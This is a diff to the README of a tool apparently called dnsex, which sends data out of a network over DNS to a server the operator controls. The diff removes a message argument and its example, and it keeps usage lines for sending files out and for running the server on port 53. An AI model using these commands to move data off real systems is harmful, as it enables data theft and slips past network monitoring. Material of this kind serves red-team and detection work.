@@ -27,12 +27,11 @@ The client takes your local data, chunks it, encodes it, and sends it out over D
 
 **Usage:**
 ```bash
-dnsex client [OPTIONS] --domain <DOMAIN> [MESSAGE]
+dnsex client [OPTIONS] --domain <DOMAIN>
 ```
 
 **Options:**
 ```text
-  [MESSAGE]                    A simple text string to exfiltrate
   -d, --domain <DOMAIN>        The target domain of your DnsEx server
   -p, --port <PORT>            The DNS port to target [default: 8053]
   -f, --file <FILE>            Path to a file to exfiltrate
@@ -48,11 +47,6 @@ dnsex client [OPTIONS] --domain <DOMAIN> [MESSAGE]
 Listen on the standard DNS port (requires root/sudo).
 ```bash
 sudo dnsex server -d yourdomain.com -p 53
-```
-
-**Send a quick message:**
-```bash
-dnsex client -d yourdomain.com "Hello from the inside"
 ```
 
 **Exfiltrate a file:**
